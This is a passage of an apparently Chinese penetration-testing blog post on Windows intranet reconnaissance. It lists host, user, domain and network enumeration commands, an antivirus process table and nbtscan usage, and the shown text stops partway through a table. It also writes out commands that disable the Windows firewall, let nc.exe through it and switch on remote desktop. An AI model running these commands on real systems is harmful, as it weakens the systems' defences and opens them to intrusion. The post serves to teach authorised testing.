<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    
    <title>å†…ç½‘å­¦ä¹ ç¬”è®°äºŒ | å†…ç½‘ä¿¡æ¯æœé›† | RainMaker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    

    
        <meta property="algolia:search" data-application-id="T8IRMXQO87" data-api-key="614acade121cd1054c73da7b48c66120" data-index-name="test">
    

    

    

    
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ğŸ®</text></svg>">
    

    

    

    
<link rel="stylesheet" href="/dist/build.css?v=1637200696663.css">


    
<link rel="stylesheet" href="/dist/custom.css?v=1637200696663.css">


    <script>
        window.isPost = true
        window.aomori = {
            
            
            valine: {
                enable: true,
                appId: "xClBvTvhGrfI2roMnMSLmHUm-gzGzoHsz",
                appKey: "Qi9SH982uKy3x14sNYdKegyJ",
            },
            
            
        }
        window.aomori_logo_typed_animated = true
        window.aomori_search_algolia = true

    </script>

<meta name="generator" content="Hexo 5.4.0"></head>
<body>
	
    <div class="container">
    <header class="header">
		<meta name="baidu-site-verification" content="code-YWFjIbmZen" />
        <div class="header-type">
            
            <div class="header-type-avatar avatar avatar-sm">
                <img src="/images/avatar.jpg" alt="">
            </div>
            
            <div class="header-type-inner">
                
                    <div id="typed-strings" style="display:none">
                        <p>RainMaker</p>
                    </div>
                    <a class="header-type-title" id="typed" href="/"></a>
                
    
                
            </div>
        </div>
        <div class="header-menu">
            <div class="header-menu-inner">
                
                <a href="/">Home</a>
                
                <a href="/archives">Archives</a>
                
                <a href="/friends">Friends</a>
                
            </div>
            <div class="header-menu-social">
                
    <a class="social" target="_blank" href="">
        <box-icon type='' name=''></box-icon>
    </a>

    <a class="social" target="_blank" href="">
        <box-icon type='' name=''></box-icon>
    </a>

            </div>
        </div>

        <div class="header-menu-mobile">
            <div class="header-menu-mobile-inner" id="mobile-menu-open">
                <i class="icon icon-menu"></i>
            </div>
        </div>
    </header>

    <div class="header-menu-mobile-menu">
        <div class="header-menu-mobile-menu-bg"></div>
        <div class="header-menu-mobile-menu-wrap">
            <div class="header-menu-mobile-menu-inner">
                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
                    <i class="icon icon-cross"></i>
                </div>
                <div class="header-menu-mobile-menu-list">
                    
                    <a href="/">Home</a>
                    
                    <a href="/archives">Archives</a>
                    
                    <a href="/friends">Friends</a>
                    
                </div>
            </div>
        </div>
    </div>

</div>

    <div class="container">
        <div class="main">
            <section class="inner">
                <section class="inner-main">
                    <div class="post">
    <article id="post-cl43rsujg0000v25ycrbma5hq" class="article article-type-post" itemscope
    itemprop="blogPost">

    <div class="article-inner">

        
          
        
        
        

        
        <header class="article-header">
            
  
    <h1 class="article-title" itemprop="name">
      å†…ç½‘å­¦ä¹ ç¬”è®°äºŒ | å†…ç½‘ä¿¡æ¯æœé›†
    </h1>
  

        </header>
        

        <div class="article-more-info article-more-info-post hairline">

            <div class="article-date">
  <time datetime="2021-12-04T16:21:00.000Z" itemprop="datePublished">2021-12-05</time>
</div>

            
            <div class="article-category">
                <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">å†…ç½‘æ¸—é€</a>,<a class="article-category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">å·¥å…·ä½¿ç”¨</a>
            </div>
            

            
            <div class="article-tag">
                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a></li></ul>
            </div>
            

            
            <div class="article-busuanzi">
                    æœ‰ <span id="busuanzi_value_page_pv">N</span> äººçœ‹è¿‡
            </div>
            

        </div>

        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
            <p>â€‹        å†…ç½‘æ¸—é€æµ‹è¯•ä¸å¸¸è§„çš„æ¸—é€æµ‹è¯•æ˜¯æˆªç„¶ä¸åŒçš„ã€‚å†…ç½‘æ¸—é€æµ‹è¯•çš„éœ€æ±‚æ˜¯ï¼Œè·å–å†…ç½‘ä¸­ç‰¹å®šç”¨æˆ·æˆ–æœºå™¨çš„æƒé™ï¼Œè¿›è€Œè·å¾—ç‰¹å®šçš„èµ„æºï¼Œå¯¹å†…ç½‘çš„å®‰å…¨æ€§è¿›è¡Œè¯„ä¼°ã€‚</p>
<h2 id="2-1-å†…ç½‘ä¿¡æ¯æœé›†æ¦‚è¿°"><a href="#2-1-å†…ç½‘ä¿¡æ¯æœé›†æ¦‚è¿°" class="headerlink" title="2.1 å†…ç½‘ä¿¡æ¯æœé›†æ¦‚è¿°"></a>2.1 å†…ç½‘ä¿¡æ¯æœé›†æ¦‚è¿°</h2><span id="more"></span>

<p>â€‹        æˆ‘æ˜¯è°?   ä¸€å¯¹å½“å‰æœºå™¨è§’è‰²çš„åˆ¤æ–­ã€‚</p>
<p>â€‹        è¿™æ˜¯å“ª?   ä¸€å¯¹å½“å‰æœºå™¨æ‰€å¤„ç½‘ç»œç¯å¢ƒçš„æ‹“æ‰‘ç»“æ„è¿›è¡Œåˆ†æå’Œåˆ¤æ–­ã€‚</p>
<p>â€‹        æˆ‘åœ¨å“ª?   ä¸€å¯¹å½“å‰æœºå™¨æ‰€å¤„åŒºåŸŸçš„åˆ¤æ–­ã€‚</p>
<h2 id="2-2-æ”¶é›†æœ¬æœºä¿¡æ¯"><a href="#2-2-æ”¶é›†æœ¬æœºä¿¡æ¯" class="headerlink" title="2. 2 æ”¶é›†æœ¬æœºä¿¡æ¯"></a>2. 2 æ”¶é›†æœ¬æœºä¿¡æ¯</h2><p>â€‹        æœ¬æœºä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿã€æƒé™ã€å†…ç½‘IPæ®µã€æ€æ¯’è½¯ä»¶ã€ç«¯å£ã€æœåŠ¡ã€è¡¥ä¸æ›´æ–°é¢‘ç‡ã€ç½‘ç»œè¿æ¥ã€å…±äº«ã€ä¼šè¯ç­‰ã€‚</p>
<h3 id="2-2-1-æ‰‹åŠ¨æœé›†ä¿¡æ¯"><a href="#2-2-1-æ‰‹åŠ¨æœé›†ä¿¡æ¯" class="headerlink" title="2.2.1 æ‰‹åŠ¨æœé›†ä¿¡æ¯"></a>2.2.1 æ‰‹åŠ¨æœé›†ä¿¡æ¯</h3><pre><code class="hljs powershell"><span class="hljs-comment">#æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯</span>
ipconfig    /all
netstat <span class="hljs-literal">-ano</span> | findstr ESTABLISHED

<span class="hljs-comment">#æŸ¥è¯¢ç«¯å£åˆ—è¡¨</span>
netstat <span class="hljs-literal">-ano</span>

<span class="hljs-comment">#æŸ¥è¯¢æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</span>
systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS Name&quot;</span> /C:<span class="hljs-string">&quot;OS Version&quot;</span>
systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS åç§°&quot;</span> /C:<span class="hljs-string">&quot;OS ç‰ˆæœ¬&quot;</span>
<span class="hljs-built_in">echo</span> %PROCESSOR_ARCHITECTURE%

<span class="hljs-comment">#æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ä»¥åŠç‰ˆæœ¬ï¼ˆæ•°é‡å¤§çš„è¯æ¯”è¾ƒæ…¢ï¼‰</span>
wmic product get name,version   
powershell <span class="hljs-string">&quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span>

<span class="hljs-comment">#æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</span>
tasklist
wmic service list brief

<span class="hljs-comment">#æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯</span>
wmic startup get command,caption

<span class="hljs-comment">#æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</span>
schtasks /query /fo LIST /v

<span class="hljs-comment">#æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</span>
net user
net localgroup administrators

<span class="hljs-comment">#æŸ¥è¯¢å½“å‰åœ¨çº¿ç”¨æˆ·</span>
query user || qwinsta

<span class="hljs-comment">#åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯</span>
net session

<span class="hljs-comment">#æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨</span>
systeminfo | findstr KB
wmic qfe get Caption,Description,HotFixID,InstalledOn

<span class="hljs-comment">#æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨</span>
net share
wmic share get name,path,status

<span class="hljs-comment">#æŸ¥è¯¢è·¯ç”±è¡¨ä»¥åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨</span>
route print
arp <span class="hljs-literal">-a</span>

<span class="hljs-comment">#å…³é—­é˜²ç«å¢™(windows server 2003 ä¹‹å‰)</span>
netsh firewall <span class="hljs-built_in">set</span> opmode disable 
<span class="hljs-comment">#å…³é—­é˜²ç«å¢™(windows server 2003 ä¹‹å)</span>
netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off
<span class="hljs-comment">#æŸ¥çœ‹é˜²ç«å¢™é…ç½®</span>
netsh firewall show config

<span class="hljs-comment">#ä¿®æ”¹é˜²ç«å¢™é…ç½®(windows server 2003 ä¹‹å‰)ï¼Œå…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥</span>
netsh firewall add allowdprogram c:\nc.exe <span class="hljs-string">&quot;allow nc&quot;</span> enable
<span class="hljs-comment">#ä¿®æ”¹é˜²ç«å¢™é…ç½®(windows server 2003 ä¹‹å),å…è®¸æŒ‡å®šçš„ç¨‹åºè¿›å…¥å’Œé€€å‡º</span>
netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow program=<span class="hljs-string">&quot;C:\nc.exe&quot;</span>
netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow nc&quot;</span> <span class="hljs-built_in">dir</span>=out action=allow program=<span class="hljs-string">&quot;C:\nc.exe&quot;</span>
<span class="hljs-comment">#å…è®¸3389ç«¯å£æ”¾è¡Œ</span>
netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;RemoteDesktop&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow localport=<span class="hljs-number">3389</span>
<span class="hljs-comment">#è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½®</span>
netsh advfirewall <span class="hljs-built_in">set</span> currentprofile logging filename <span class="hljs-string">&quot;C:\windows\temp\fw.log&quot;</span>

<span class="hljs-comment">#æŸ¥è¯¢ä»£ç†é…ç½®æƒ…å†µ</span>
reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span>

<span class="hljs-comment">#æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</span>
reg query <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\Rdp-Tcp&quot;</span> /V PortNumber

<span class="hljs-comment">#æŸ¥è¯¢ç³»ç»Ÿæ˜¯å¦å…è®¸3389è¿œç¨‹è¿æ¥ï¼š1è¡¨ç¤ºå…³é—­3389ï¼Œ0è¡¨ç¤º3389å¼€å¯</span>
REG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections

<span class="hljs-comment">#åœ¨windows server 2003å¼€å¯3389ç«¯å£</span>
wmic path win32_terminalservicesetting <span class="hljs-built_in">where</span> (__CLASS !=<span class="hljs-string">&quot;&quot;</span>) call setallowtsconnections <span class="hljs-number">1</span>

<span class="hljs-comment">#åœ¨windows server 2008å¼€å¯3389ç«¯å£</span>
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="hljs-built_in">where</span> (__CLASS !=<span class="hljs-string">&quot;&quot;</span>) call setallowtsconnections <span class="hljs-number">1</span>

<span class="hljs-comment">#åœ¨windows server 2012å¼€å¯3389ç«¯å£ï¼Œå®é™…æµ‹è¯•ä¸‹æ¥win32_tsgeneralsetting è®¾ç½®å¹¶æœªæˆåŠŸå¼€å¯3389ç«¯å£ï¼Œè¿˜æ˜¯ç”¨win2008çš„å‘½ä»¤å¼€å¯</span>
wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting <span class="hljs-built_in">where</span> (TerminalName=<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired <span class="hljs-number">1</span>

<span class="hljs-comment">#2012æ²¡æœ‰tsconfig.msc,å­˜åœ¨RDMSé™åˆ¶è¿œç¨‹æ¡Œé¢ç™»å½•ï¼Œéœ€è¦ä¿®æ”¹fSingleSessionPerUser</span>
reg add <span class="hljs-string">&quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;</span> /v fSingleSessionPerUser /t REG_DWORD /d <span class="hljs-number">0</span> /f

<span class="hljs-comment">#æ­£å¸¸æƒ…å†µä¸‹å¼€å¯3389ç«¯å£ï¼šé€šè¿‡cmd</span>
REG ADD <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f
REG ADD <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber /t REG_DWORD /d <span class="hljs-number">0</span>x00000d3d /f

<span class="hljs-comment">#é€šè¿‡regæ–‡ä»¶</span>
Windows Registry Editor Version <span class="hljs-number">5.00</span>
[<span class="hljs-type">HKEY_LOCAL_MACHINE</span>\<span class="hljs-type">SYSTEM</span>\<span class="hljs-type">CurrentControlSet</span>\<span class="hljs-type">Control</span>\<span class="hljs-type">Terminal</span> <span class="hljs-type">Server</span>]
<span class="hljs-string">&quot;fDenyTSConnections&quot;</span>=dword:<span class="hljs-number">00000000</span>
[<span class="hljs-type">HKEY_LOCAL_MACHINE</span>\<span class="hljs-type">SYSTEM</span>\<span class="hljs-type">CurrentControlSet</span>\<span class="hljs-type">Control</span>\<span class="hljs-type">Terminal</span> <span class="hljs-type">Server</span>\<span class="hljs-type">WinStations</span>\<span class="hljs-type">RDP</span>-<span class="hljs-type">Tcp</span>]
<span class="hljs-string">&quot;PortNumber&quot;</span>=dword:<span class="hljs-number">00000</span>d3d

<span class="hljs-comment">#å¯¼å…¥æ³¨å†Œè¡¨ï¼š</span>
regedit /s a.reg</code></pre>

<p><strong>å¸¸è§æ€è½¯åˆ—è¡¨ï¼š</strong></p>
<table>
<thead>
<tr>
<th align="left">è¿›ç¨‹</th>
<th>è½¯ä»¶åç§°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">360sd.exe</td>
<td>360æ€æ¯’</td>
</tr>
<tr>
<td align="left">360tray.exe</td>
<td>360å®æ—¶ä¿æŠ¤</td>
</tr>
<tr>
<td align="left">ZhuDongFangYu.exe</td>
<td>360ä¸»åŠ¨é˜²å¾¡</td>
</tr>
<tr>
<td align="left">KSafeTray.exe</td>
<td>é‡‘å±±å«å£«</td>
</tr>
<tr>
<td align="left">SafeDogUpdateCenter.exe</td>
<td>æœåŠ¡å™¨å®‰å…¨ç‹—</td>
</tr>
<tr>
<td align="left">McAfee McShield.exe</td>
<td>McAfee</td>
</tr>
<tr>
<td align="left">ecgui.exe</td>
<td>NOD32</td>
</tr>
<tr>
<td align="left">AVP.EXE</td>
<td>å¡å·´æ–¯åŸº</td>
</tr>
<tr>
<td align="left">avguard.exe</td>
<td>å°çº¢ä¼</td>
</tr>
<tr>
<td align="left">bdagent.exe</td>
<td>BitDefender</td>
</tr>
</tbody></table>
<h3 id="2-2-2-è‡ªåŠ¨æœé›†ä¿¡æ¯"><a href="#2-2-2-è‡ªåŠ¨æœé›†ä¿¡æ¯" class="headerlink" title="2.2.2 è‡ªåŠ¨æœé›†ä¿¡æ¯"></a>2.2.2 è‡ªåŠ¨æœé›†ä¿¡æ¯</h3><p>â€‹        é€šè¿‡batè„šæœ¬è¿›è¡Œæœé›†ã€‚repo: <a target="_blank" rel="noopener" href="https://github.com/SevenC-base/PostExploitation/tree/master/windows/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">https://github.com/SevenC-base/PostExploitation/</a></p>
<h3 id="2-2-3-é€šè¿‡Empireçš„ä¿¡æ¯æœé›†æ¨¡å—"><a href="#2-2-3-é€šè¿‡Empireçš„ä¿¡æ¯æœé›†æ¨¡å—" class="headerlink" title="2.2.3 é€šè¿‡Empireçš„ä¿¡æ¯æœé›†æ¨¡å—"></a>2.2.3 é€šè¿‡Empireçš„ä¿¡æ¯æœé›†æ¨¡å—</h3><p>â€‹        å¯ä»¥å‚è€ƒåšæ–‡ï¼š<a href="https://hasaki-h2.github.io/f0bfc07b.html">Empire-é…ç½®å®‰è£…å’ŒåŸºæœ¬ä½¿ç”¨</a></p>
<pre><code class="hljs powershell">usemodule situational_awareness/host/winenum
usemodule situational_awareness/host/computerdetails</code></pre>

<p>â€‹    <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20211210203228598.png"></p>
<h2 id="2-3-æŸ¥è¯¢å½“å‰æƒé™"><a href="#2-3-æŸ¥è¯¢å½“å‰æƒé™" class="headerlink" title="2.3 æŸ¥è¯¢å½“å‰æƒé™"></a>2.3 æŸ¥è¯¢å½“å‰æƒé™</h2><h3 id="1-æŸ¥çœ‹å½“å‰æƒé™"><a href="#1-æŸ¥çœ‹å½“å‰æƒé™" class="headerlink" title="1. æŸ¥çœ‹å½“å‰æƒé™"></a>1. æŸ¥çœ‹å½“å‰æƒé™</h3><pre><code class="hljs powershell">whoami</code></pre>

<ul>
<li><p>æœ¬åœ°æ™®é€šç”¨æˆ·åªèƒ½æŸ¥è¯¢æœ¬æœºç›¸å…³ä¿¡æ¯ï¼Œä¸èƒ½æŸ¥è¯¢åŸŸå†…ä¿¡æ¯ã€‚</p>
</li>
<li><p>æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·å’ŒåŸŸå†…ç”¨æˆ·å¯ä»¥æŸ¥è¯¢åŸŸå†…ä¿¡æ¯ã€‚</p>
</li>
</ul>
<p>åŸç†ï¼šåŸŸå†…çš„æ‰€æœ‰æŸ¥è¯¢éƒ½æ˜¯é€šè¿‡åŸŸæ§åˆ¶å™¨å®ç°çš„ï¼ˆåŸºäºLDAPåè®®ï¼‰ï¼Œè€Œè¿™ä¸ªæŸ¥è¯¢éœ€è¦ç»è¿‡æƒé™è®¤è¯ï¼Œæ‰€ä»¥åªæœ‰åŸŸç”¨æˆ·æ‰æ‹¥æœ‰è¿™ä¸ªæƒé™ã€‚å½“åŸŸç”¨æˆ·æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤æ—¶ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨Kerberosåè®®ï¼Œæ— é¡»é¢å¤–è¾“å…¥è´¦å·å’Œå¯†ç ã€‚æœ¬åœ°ç®¡ç†å‘˜administratoræƒé™å¯ä»¥ç›´æ¥æå‡ä¸ºNt authorityæˆ–Systemæƒé™ï¼Œå› æ­¤åœ¨åŸŸä¸­ï¼Œé™¤æ™®é€šç”¨æˆ·å¤–ï¼Œæ‰€æœ‰æœºå™¨éƒ½æœ‰ä¸€ä¸ªæœºå™¨ç”¨æˆ·ï¼ˆç”¨æˆ·åæ˜¯æœºå™¨ååŠ ä¸Šâ€$â€ï¼‰ã€‚åœ¨æœ¬è´¨ä¸Šï¼Œæœºå™¨çš„systemç”¨æˆ·å¯¹åº”çš„å°±æ˜¯åŸŸé‡Œè¾¹çš„æœºå™¨ç”¨æˆ·ã€‚æ‰€ä»¥ä½¿ç”¨Systemæƒé™å¯ä»¥è¿è¡ŒåŸŸå†…çš„æŸ¥è¯¢å‘½ä»¤ã€‚</p>
<h3 id="2-è·å–åŸŸSID"><a href="#2-è·å–åŸŸSID" class="headerlink" title="2. è·å–åŸŸSID"></a>2. è·å–åŸŸSID</h3><pre><code class="hljs powershell">whoami /all</code></pre>

<p>å½“å‰åŸŸtest.comçš„SIDä¸ºï¼šS-1-5-21-636858252-868354219-2394751447</p>
<p>åŸŸç”¨æˆ·zsçš„SIDä¸ºï¼šS-1-5-21-636858252-868354219-2394751447-1111</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112130243601.png" alt="image-20220112130243601"></p>
<h3 id="3-æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯"><a href="#3-æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="3. æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯"></a>3. æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</h3><pre><code class="hljs plaintext">net user XXX /domain</code></pre>

<p>å¯ä»¥æŸ¥è¯¢åˆ°å½“å‰ç”¨æˆ·çš„æƒé™ï¼Œç»„ï¼Œç™»å½•æ—¶é—´ç­‰ä¿¡æ¯ã€‚</p>
<h2 id="2-4-åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#2-4-åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="2.4. åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>2.4. åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h2><h3 id="1-Ipconfig"><a href="#1-Ipconfig" class="headerlink" title="1. Ipconfig"></a>1. Ipconfig</h3><pre><code class="hljs powershell">ipconfig /all

<span class="hljs-comment">#é€šè¿‡åå‘è§£ææŸ¥è¯¢å‘½ä»¤</span>
nslookup test.com</code></pre>

<h3 id="2-æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯"><a href="#2-æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯" class="headerlink" title="2. æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯"></a>2. æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</h3><p>â€‹        ç™»å½•æœåŠ¡å™¨ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œå¦‚æœåŸŸä¸ºâ€WORKGROUPâ€ï¼Œè¡¨ç¤ºå½“å‰æœåŠ¡å™¨ä¸åœ¨åŸŸå†…ã€‚</p>
<pre><code class="hljs plaintext">systeminfo</code></pre>

<h3 id="3-æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯"><a href="#3-æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="3. æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯"></a>3. æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯</h3><p>â€‹        â€œå·¥ä½œç«™åŸŸ DNS åç§°â€ ä¸ºåŸŸåï¼Œâ€ç™»å½•åŸŸâ€ ç”¨æˆ·è¡¨ç¤ºå½“å‰ç™»å½•çš„ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·è¿˜æ˜¯æœ¬åœ°ç”¨æˆ·ã€‚</p>
<pre><code class="hljs plaintext">net config workstation</code></pre>

<h3 id="4-åˆ¤æ–­ä¸»åŸŸ"><a href="#4-åˆ¤æ–­ä¸»åŸŸ" class="headerlink" title="4. åˆ¤æ–­ä¸»åŸŸ"></a>4. åˆ¤æ–­ä¸»åŸŸ</h3><pre><code class="hljs plaintext">net time /domain</code></pre>

<p>å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220607193705051.png" alt="image-20220607193705051" style="zoom: 50%;" />

<p>å­˜åœ¨åŸŸï¼Œä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112134922646.png" alt="image-20220112134922646"></p>
<p>ä¸å­˜åœ¨åŸŸï¼Œå½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220607201421267.png" alt="image-20220607201421267" style="zoom: 67%;" />

<h2 id="2-5-æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#2-5-æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="2.5. æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>2.5. æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h2><h3 id="2-5-1-åˆ©ç”¨NetBIOSå¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#2-5-1-åˆ©ç”¨NetBIOSå¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="2.5.1 åˆ©ç”¨NetBIOSå¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>2.5.1 åˆ©ç”¨NetBIOSå¿«é€Ÿæ¢æµ‹å†…ç½‘</h3><p>â€‹        NetBIOSæ˜¯å±€åŸŸç½‘ç¨‹åºä½¿ç”¨çš„ä¸€ç§åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰ï¼Œä¸ºç¨‹åºæä¾›äº†è¯·æ±‚ä½çº§åˆ«æœåŠ¡ çš„ç»Ÿä¸€çš„å‘½ä»¤é›†ï¼Œä¸ºå±€åŸŸç½‘æä¾›äº†ç½‘ç»œåŠå…¶ä»–ç‰¹æ®ŠåŠŸèƒ½ã€‚å‡ ä¹æ‰€æœ‰çš„å±€åŸŸç½‘éƒ½æ˜¯åœ¨NetBIOSåè®® çš„åŸºç¡€ä¸Šå·¥ä½œçš„ã€‚NetBIOSä¹Ÿæ˜¯è®¡ç®—æœºçš„æ ‡è¯†åï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘ä¸­è®¡ç®—æœºçš„äº’è®¿ã€‚NetBIOSçš„ å·¥ä½œæµç¨‹å°±æ˜¯æ­£å¸¸çš„æœºå™¨åè§£ææŸ¥è¯¢åº”ç­”è¿‡ç¨‹ï¼Œå› æ­¤æ¨èä¼˜å…ˆä½¿ç”¨ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/3b292df5e0fe9925bc31581f48f849df8db1cb13db66" alt="img"></p>
<p>nbtscanæ˜¯â€”ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ‰«ææœ¬åœ°æˆ–è¿œç¨‹ TCP/IP ç½‘ç»œä¸Šçš„å¼€æ”¾ NetBIOS åç§°æœåŠ¡å™¨ã€‚nbtscanæœ‰Windowså’ŒLinuxä¸¤ä¸ªç‰ˆæœ¬ï¼Œä½“ç§¯å°ï¼Œä¸éœ€è¦å®‰è£…ç‰¹æ®Šçš„åº“æˆ–DLLå°±èƒ½ä½¿ç”¨ã€‚</p>
<p>repoï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/scallywag/nbtscan">https://github.com/scallywag/nbtscan</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/lifenjoiner/nbtscan">https://github.com/lifenjoiner/nbtscan</a></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112142228726.png" alt="image-20220112142228726"></p>
<p>ç¬¬â€”åˆ—ä¸ºIPåœ°å€ï¼Œç¬¬äºŒåˆ—ä¸ºæœºå™¨åå’Œæ‰€åœ¨åŸŸçš„åç§°ï¼Œæœ€åä¸€åˆ—æ˜¯æœºå™¨æ‰€å¼€å¯çš„æœåŠ¡çš„åˆ—è¡¨ï¼Œå…·ä½“å«ä¹‰å¦‚è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th>Token</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>SHARING</td>
<td>è¯¥æœºå™¨ç§å­˜åœ¨æ­£åœ¨è¿è¡Œçš„æ–‡ä»¶å’Œæ‰“å°å…±äº«æœåŠ¡ï¼Œä½†ä¸ä¸€å®šæœ‰å†…å®¹å…±äº«</td>
</tr>
<tr>
<td>DC</td>
<td>è¯¥æœºå™¨å¯èƒ½æ˜¯åŸŸæ§åˆ¶å™¨</td>
</tr>
<tr>
<td>U=USER</td>
<td>è¯¥æœºå…¶ä¸­æœ‰ç™»å½•åä¸ºUserçš„ç”¨æˆ·ï¼ˆä¸å¤ªå‡†ç¡®ï¼‰</td>
</tr>
<tr>
<td>IIS</td>
<td>è¯¥æœºå™¨ç§å¯èƒ½å®‰è£…äº†IISæœåŠ¡å™¨</td>
</tr>
<tr>
<td>EXCHANGE</td>
